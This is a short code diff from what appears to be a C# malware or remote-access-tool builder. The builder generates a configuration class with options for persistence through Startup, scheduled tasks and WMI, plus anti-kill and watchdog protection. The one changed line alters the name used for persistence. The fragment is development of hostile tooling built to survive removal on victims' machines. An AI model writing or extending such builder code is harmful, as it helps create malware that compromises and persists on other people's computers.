@@ -2922,7 +2922,7 @@ internal static class Config
     public const bool PersistStartup = {(BldPersistStartup.IsChecked == true ? "true" : "false")};
     public const bool PersistTask = {(BldPersistTask.IsChecked == true ? "true" : "false")};
     public const bool PersistWmi = {(BldPersistWmi.IsChecked == true ? "true" : "false")};
-    public const string PersistName = ""{Esc(fileNameNoExt.ToLowerInvariant())}"";
+    public const string PersistName = ""{Esc(installFolder.ToLowerInvariant())}"";
 
     public const bool AntiKill = {(BldAntiKill.IsChecked == true ? "true" : "false")};
     public const bool EnableWatchdog = {(BldAntiKill.IsChecked == true ? "true" : "false")};
